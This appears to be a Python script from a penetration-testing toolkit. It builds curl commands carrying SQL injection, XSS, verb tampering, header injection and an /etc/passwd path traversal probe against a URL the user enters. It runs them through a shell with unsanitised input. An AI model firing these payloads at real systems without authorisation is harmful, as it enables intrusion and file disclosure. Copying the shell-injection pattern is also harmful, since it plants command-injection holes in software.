#!/usr/bin/env python3
import sys
sys.dont_write_bytecode = True
import subprocess
import sys
import os
import time
import select

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from recon_deps import ensure_commands, get_output_base

ensure_commands(["curl"])

def prompt_with_timeout(prompt, default=None, timeout=3):
    print(prompt)
    print(f"⏱️ Timeout in {timeout} seconds (default: {default})")
    
    rlist, _, _ = select.select([sys.stdin], [], [], timeout)
    if rlist:
        user_input = sys.stdin.readline().rstrip()
        return user_input if user_input else default
    else:
        print(f"⏱️ Timeout, using default: {default}")
        return default

def main():
    if len(sys.argv) != 3:
        print("Usage: ./Manual.py <ip_address> <port>")
        sys.exit(1)
    
    ip = sys.argv[1]
    port = sys.argv[2]
    
    # Create output directory
    output_dir = f"{get_output_base()}/{ip}/Manual"
    os.makedirs(output_dir, exist_ok=True)
    report_file = f"{output_dir}/report.txt"
    
    print("================[ MANUAL TEST MENU ]================")
    print("[1] SQL Injection Tests (3s default)")
    print("[2] XSS Tests")
    print("[3] Auth Bypass Tests")
    print("========================================================")
    
    choice = prompt_with_timeout("[?] Select option:", "1")
    
    if choice == "1":
        print("================[ TESTING OPTIONS ]================")
        print("1. Union-based SQLi")
        print("2. Error-based SQLi")
        print("3. Boolean-based SQLi")
        test_choice = prompt_with_timeout("[?] Select:", "1")
        
        if test_choice == "1":
            payload = "' UNION SELECT NULL, version() --"
        elif test_choice == "2":
            payload = "' AND (SELECT COUNT(*) FROM information_schema.tables)>0 --"
        else:
            payload = "' AND 1=1 --"
        
        url = input("[!] Target URL: ")
        cmd = f"curl -G --data-urlencode \"id={payload}\" {url}"
        
    elif choice == "2":
        print("================[ TESTING OPTIONS ]================")
        print("1. Reflected XSS")
        print("2. Stored XSS")
        print("3. DOM-based XSS")
        test_choice = prompt_with_timeout("[?] Select:", "1")
        
        if test_choice == "1":
            payload = "<script>alert('XSS')</script>"
        elif test_choice == "2":
            payload = "<img src=x onerror=alert('XSS')>"
        else:
            payload = "<script>document.body.innerHTML='<h1>XSS</h1>'</script>"
        
        url = input("[!] Target URL: ")
        cmd = f"curl -G --data-urlencode \"q={payload}\" {url}"
        
    else:
        print("================[ TESTING OPTIONS ]================")
        print("1. HTTP Verb Tampering")
        print("2. Header Injection")
        print("3. Path Traversal")
        test_choice = prompt_with_timeout("[?] Select:", "1")
        
        if test_choice == "1":
            url = input("[!] Target URL: ")
            cmd = f"curl -X PUT {url}"
        elif test_choice == "2":
            url = input("[!] Target URL: ")
            header = input("[!] Header: ")
            cmd = f"curl -H \"{header}\" {url}"
        else:
            url = input("[!] Target URL: ")
            cmd = f"curl {url}/../../../etc/passwd"
    
    try:
        with open(report_file, 'w') as report:
            process = subprocess.Popen(
                cmd,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                universal_newlines=True
            )
            
            for line in process.stdout:
                print(line, end='')
                report.write(line)
            
            process.wait()
        
        print("====================================================")
        print(f"✅ Report saved to: {report_file}")
    except Exception as e:
        print(f"❌ Error: {e}")

if __name__ == "__main__":
    main()
